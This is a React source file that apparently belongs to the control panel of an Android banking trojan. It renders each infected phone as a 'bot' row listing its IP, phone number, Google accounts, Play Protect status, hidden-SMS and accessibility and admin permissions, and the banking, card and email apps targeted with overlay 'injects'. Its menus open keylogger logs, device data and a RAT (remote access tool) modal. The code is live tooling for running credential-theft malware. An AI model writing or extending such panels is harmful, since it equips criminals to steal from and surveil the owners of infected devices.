import React from 'react';
import { isNullOrUndefined } from 'util';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';
import EditCommentUniversal from '../EditCommentUniversal';
import { Link, NavLink } from 'react-router-dom';
import { stat } from 'fs';

class BotsRow extends React.Component {

    state = {
        botId: "UNKNOWN UID",
        botAndroidVersion: "0.0.0",
        botTagsList: "null",
        botCountry: "not",
        botBanks: "none",
        statProtect: 0,
        statScreen: 0,
        statAccessibility: 0,
        statAdmin: 0,
        botLastActivity: "Unknown",
        comment: "",
        botAddDate: "Unknown Date",
        botIp: '0.0.0.0',
        WaitCommand: '',
        operator: '',
        phoneNumber:'',
        model: '',
        step: 0,
        isLogsInjects : '',
        perms_storage: 0,
        perms_sms: 0,
        perms_phone_state: 0,
        perms_contacts: 0,
        statSMS: 0,
        google_account: '',
        checked: false // Статус выбран ли этот бот (чекбокс)
    };

    updateBotInfo = () => {
        if(!isNullOrUndefined(this.props.botId)) {
            this.state.botId = this.props.botId;
            this.state.checked = (SettingsContext.SelectedBots.indexOf(this.props.botId) > -1);
        }

        // Имена пропсов, которые надо загнать в стейт (если они есть)
        let names = ['botAndroidVersion','botTagsList','botCountry','botBanks',
            'statProtect','statScreen','statAccessibility','statAdmin','comment',
            'botLastActivity','botAddDate','botIp','WaitCommand','operator','phoneNumber','model','step','isLogsInjects',
            'perms_storage','perms_sms','perms_phone_state','perms_contacts','statSMS','google_account'];
        

         
        for(let name of names) {
            if(!isNullOrUndefined(this.props[name]))
                this.state[name] = this.props[name];
        }
    }

    toggleChange = () => {
        let botid = this.state.botId;
        let checkbox_status = (SettingsContext.SelectedBots.indexOf(botid) > -1);
        if(!checkbox_status) {
            SettingsContext.SelectedBots.push(botid);
            this.setState({checked: true});
        }
        else {
            SettingsContext.SelectedBots.remove(botid);
            this.setState({checked: false});
        }
    }


   

    lastActivityCalc() {
        if(this.state.botLastActivity < 60) {
            return "<span style='color:green;'>" + this.state.botLastActivity + " sek</span>";
        }
        else if(this.state.botLastActivity < 3600) {
            return "<span style='color:#ff9800;'>" + parseInt(this.state.botLastActivity/60) + " min</span>";
        }
        else if(this.state.botLastActivity < 86400) {
            
            let hours = "";
            if(parseInt(this.state.botLastActivity/60/60) > 1)hours = "s"
            return "<span style='color:#696969;'>" + parseInt(this.state.botLastActivity/60/60) + " hour" + hours + "</span>";
        }
        else {
            let days = "";
            if(parseInt(this.state.botLastActivity/60/60/24) > 1)days = "s"
            return "<span style='color:#C0C0C0;'>" + parseInt(this.state.botLastActivity/60/60/24) + "<span class='isteps'><br/>day" + days + "</span>";
        }
    }

    icon(){
        return '<i class="fa-yellow far fa-eye" data-placement="bottom" data-toggle="tooltip" title="User looks at the screen"></i>';
    }

    iconAV_Protect(){
        let html = "<center style='line-height: 23px; font-size: 18px; margin-top: 13px;'>";

        if(this.state.statProtect == 1) {
            html += "<i class=\"fa-red fa fa-exclamation-triangle\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Google Play Protect Enabled\"></i>";
        }
        return html;
    }

    ServicesIcons(idbot) {
        let html = "<div style='margin-top: 4px'>";
        
        if(this.state.statScreen == 1) {
            html += "<i class=\"far fa-eye\" style='font-size: 15px; color:#5C5C5C' title='Holder looks at the screen'></i>";
        }
        else {
            html += "<i class=\"far fa-low-vision\" style='font-size: 15px; color:#B8B8B8'  title='Holder does not look at the screen'></i>";
        }
        if(this.state.statSMS == 1) {
            html += " <i class=\"fas fa-comments-dollar\" style='font-size: 15px; color:#5C5C5C'  title='Hidden SMS enabled'></i>";
        }
        else {
            html += " <i class=\"fas fa-comment-slash\" style='font-size: 15px; color:#B8B8B8'  title='Hidden SMS disabled'></i>";
        }
        if(this.state.statAccessibility == 1) {
            html += " <i class=\"fa-black fas fa-bug\" style='font-size: 15px; color:#5C5C5C' title='Accessibility service enabled'></i>";
        }
        else {
            html += " <i class=\"fa fa-bug\" style='font-size: 15px; color:#B8B8B8' title='Accessibility service disabled'><i class='checkIconRed fa fa-times'></i></i>";
        }

        if(this.state.statAdmin == 1) {
            html += " <i class=\"fab fa-android\" style='color:#5C5C5C; font-size: 17px;'  title=\"There Are Admin Permission\"></i>";
        }
        else {
            html += " <i class=\"fab fa-android\" style='color:#B8B8B8; font-size: 17px;'   title=\"No Admin Permission\"><i class='checkIconRed2 fa fa-times'></i></i>";
        }

        if(this.state.perms_storage == 1) {
            html += " <i class=\"fas fa-sim-card\" style='color:#5C5C5C; font-size: 15px;'  title='There are WRITE/READ EXTERNAL STORAGE permission'></i>";
        }
        else {
            html += " <i class=\"fas fa-sim-card\" style='color:#B8B8B8; font-size: 15px;'   title='No WRITE/READ EXTERNAL STORAGE permission'><i class='checkIconRed fa fa-times'></i></i>";
        }
        if(this.state.perms_sms == 1) {
            html += " <i class=\"fas fa-sms\" style='color:#5C5C5C; font-size: 15px;'  title='There are SMS permission'></i>";
        }
        else {
            html += " <i class=\"fas fa-sms\" style='color:#B8B8B8; font-size: 15px;'  title='No SMS permission'><i class='checkIconRed fa fa-times'></i></i>";
        }
        if(this.state.perms_phone_state == 1) {
            html += " <i class=\"fas fa-phone-square\" style='color:#5C5C5C; font-size: 15px;' title='There are READ PHONE STATE permission'></i>";
        }
        else {
            html += " <i class=\"fas fa-phone-square\" style='color:#B8B8B8; font-size: 15px;' title='No READ PHONE STATE permission'><i class='checkIconRed fa fa-times'></i></i>";
        }
        if(this.state.perms_contacts == 1) {
            html += " <i class=\"fas fa-address-book\" style='color:#5C5C5C; font-size: 15px;' title='There are READ CONTACTS permission'></i>";
        }
        else {
            html += " <i class=\"fas fa-address-book\" style='color:#B8B8B8; font-size: 15px;' title='No READ CONTACTS permission'><i class='checkIconRed fa fa-times'></i></i>";
        }
        html += '</div>';
        return html;
    }

    FaCheckBox() {
        return this.state.checked ? 'far fa-check-square' : 'far fa-square';
    }


   


    ChangeDefaultComment(newComment) {
        this.setState({
            comment: newComment
        });
    }



    banks(list){
        
        let arrayHTML = [];


        if(list.split(':').length==2){
            list = ':' + list;
        }
        let parts = list.split(':');
       
        for (let i = 0; i < parts.length; i++){
            let isLog = false;
            if(parts[i].length>1){ //empty
                let icon = '';
                if(parts[i].indexOf('[B]') != -1){
                    parts[i] = parts[i].replace('[B]','');
                    if(this.state.isLogsInjects.indexOf(parts[i]) != -1) {
                        isLog = true;
                        icon = '<i class="far fa-university" style="cursor: pointer; color: green; font-size:12px"  title="Bank"></i> ';
                    }else{
                        icon = '<i class="far fa-university" style="font-size:12px"  title="Bank"></i> ';
                    }
                }else if(parts[i].indexOf('[C]') != -1){
                    parts[i] = parts[i].replace('[C]','');  
                    if(this.state.isLogsInjects.indexOf(parts[i]) != -1) {
                        isLog = true;
                        icon = '<i class="far fa-credit-card" style="cursor: pointer; color: green; font-size:12px"  title="Credit card"></i> ';
                    }else{
                        icon = '<i class="far fa-credit-card" style="font-size:12px"  title="Credit card"></i> ';
                    }
                }else if(parts[i].indexOf('[E]') != -1){
                    parts[i] = parts[i].replace('[E]','');
                    if(this.state.isLogsInjects.indexOf(parts[i]) != -1) {
                        isLog = true;
                        icon = '<i class="far fa-envelope" style="cursor: pointer; color: green; font-size:12px"  title="Email"></i> ';
                    }else{
                        icon = '<i class="far fa-envelope" style="font-size:12px"  title="Email"></i> ';
                    }
                }

                if(isLog){
                    arrayHTML[i] =  icon + '<span style="cursor: pointer" class="bank_hover BankStyle2">'+ parts[i] + '</span>'  + '<br/>';
                }else{
                    arrayHTML[i] =  icon + '<span class="BankStyle2">'+ parts[i] + '</span>'  + '<br/>';
                }
                
            }
        }
        return arrayHTML;
    }

    onClickBank(name){
     try {
        name = /<span style="cursor: pointer" class="bank_hover BankStyle2">(.*?)<\/span>/g.exec(name)[1];

        SettingsContext.CurrentSetBot = "";
        SettingsContext.CurrentSetBot = this.state.botId;
        SettingsContext.NameApplication = name;
        SettingsContext.start_modul = 'LogsInjectsModal';
        try_eval('$("#LogsInjectsModal").modal("show");');
        this.props.BotListForceUpdate();

     } catch (err) {  } 
    }

    data_device(){
        let data = '';
        if(this.state.model.length>=2){data = this.state.model + '<br/>';}
        if(this.state.operator.length>=2){ data = data + this.state.operator + '<br/>';}
        if(this.state.phoneNumber.length>=2){ data = data + this.state.phoneNumber + '<br/>';}
        if(this.state.google_account.length>=2){
            let gmail = this.state.google_account;
            if(gmail.indexOf(',')!=-1){
                let arrayGmail = gmail.split(',');
                if(arrayGmail.length <= 2){
                    data = data + arrayGmail[0];
                }else{
                    for(let i=0;i<arrayGmail.length;i++){
                        if(i == arrayGmail.length){
                            data = data + arrayGmail[i];
                        }else{
                            data = data + arrayGmail[i] + '<br/>';
                        }
                    }
                }
            }  
        }
    return data;
    }

    render () {
        this.updateBotInfo();
        const td = {
            padding: '0px'
        };
        const tdw = {
            padding: '0px',
            width: '78px'
        }
        const CenterA = {
            fontSize: '12px',
            textAlign: 'center',
            verticalAlign: 'middle',
            padding: '10px'
        }
        const CenterAA = {
            fontSize: '12px',
            textAlign: 'center',
            verticalAlign: 'middle',
            padding: '10px'
        }
          const CenterC = {
              fontSize: '12px',
            lineHeight: '1',
            textAlign: 'center',
            verticalAlign: 'middle',
            padding: '20px'
        }
        const BankStyle = {
            paddingTop: '0px',
            textAlign: 'center',
            fontSize: '10px',
            lineHeight: '14px',
        }
        let CommentStyle = {
            padding: '5px'
        }
        let CenterIdBot = {
            lineHeight: '23px',
            color:'#5C5C5C',
            fontSize:'18px'
        }

      
        return (
            <tr class={this.state.checked ? "checkedbotrow" : ""}>

               <td scope="col" style={CenterA}>
                    <div class="check-bot2">
                        <i class={this.FaCheckBox()} onClick={this.toggleChange.bind(this)} />
                    </div>
                </td>

                <td scope="col">
                    <center style={CenterIdBot}>
                        
                            <i class="idbot_i "  data-toggle="dropdown">{this.state.botId}</i>
                                <div class="menubot dropdown-menu" aria-labelledby="dropdownMenuLink">



                                    <a class="dropdown-item" onClick={() => {
                                        SettingsContext.CurrentSetBot = "";
                                        SettingsContext.CurrentSetBot = this.state.botId;
                                        SettingsContext.start_modul = 'LogsDeviceModal';
                                        try_eval('$("#LogsDeviceModal").modal("show");');
                                        this.props.BotListForceUpdate();
                                    }} >Logs device</a>

                                    <a class="dropdown-item" onClick={() => {
                                        SettingsContext.CurrentSetBot = "";
                                        SettingsContext.CurrentSetBot = this.state.botId;
                                        SettingsContext.start_modul = 'LogsKeyloggerModal';
                                        try_eval('$("#LogsKeyloggerModal").modal("show");');
                                        this.props.BotListForceUpdate();
                                    }} >Logs keylogger</a>

                                    <a class="dropdown-item" onClick={() => {
                                        SettingsContext.CurrentSetBot = "";
                                        SettingsContext.CurrentSetBot = this.state.botId;
                                        SettingsContext.start_modul = 'LogsDevice';
                                        try_eval('$("#LogsDevice").modal("show");');
                                        this.props.BotListForceUpdate();
                                    }} >Data device</a>             
                                </div>

                      <i dangerouslySetInnerHTML={{ __html:this.ServicesIcons(this.state.botId)}} />
                    </center>
                </td>
                
                <td scope="col" style={CenterAA}><img src={"/img/flag/" + this.state.botCountry + ".png"} /><br/>{this.state.botIp}</td>
                <td scope="col" style={CenterA}>{this.state.botTagsList}</td>
                <td scope="col" style={CenterA}>{this.state.botAndroidVersion}</td>
                


                <td scope="col" style={CenterA} dangerouslySetInnerHTML={{__html:this.data_device()}} />
             


                <td scope="col" dangerouslySetInnerHTML={{__html:this.iconAV_Protect()}}></td>


                <td scope="col">
                    <div style={({paddingTop: '4px', textAlign: 'left', fontSize: '10px', lineHeight: '14px'})}>
                        {this.banks(this.state.botBanks).map((value, index) => {
                                return <span dangerouslySetInnerHTML={{__html:value}} onClick={this.onClickBank.bind(this, value)} />
                            })}
                    </div>
                </td>

                

                <td scope="col" style={CenterC} dangerouslySetInnerHTML={{__html:this.lastActivityCalc()}} />
        
                <td scope="col" style={CenterA}>{this.state.botAddDate.split(' ')[0]}<br />{this.state.botAddDate.split(' ')[1]}</td>
                <td scope="col" style={CenterA}>
             
                    <div class="check-bot">
                    <i class="space-left fal fa-mobile" title='RAT' onClick={() => {
                        SettingsContext.CurrentSetBot = "";
                        SettingsContext.CurrentSetBot = this.state.botId;
                        SettingsContext.start_modul = 'RATModal';
                        try_eval('$("#RATModal").modal("show");');
                        this.props.BotListForceUpdate();
                    }} />
  
                    <i class="space-left fal fa-cogs" title='Device settings/details' onClick={() => {
                        SettingsContext.CurrentSetBot = "";
                        SettingsContext.CurrentSetBot = this.state.botId;
                        SettingsContext.start_modul = 'BotSettingsModal';
                        try_eval('$("#BotSettingsModal").modal("show");');
                        this.props.BotListForceUpdate();
                    }} />
                    </div>
                </td>
                <td scope="col" style={CommentStyle}><EditCommentUniversal parentObj={this} idbot={this.state.botId} text={this.state.comment} request="change_comment" /></td>
            </tr>
        );
    }
}

export default BotsRow;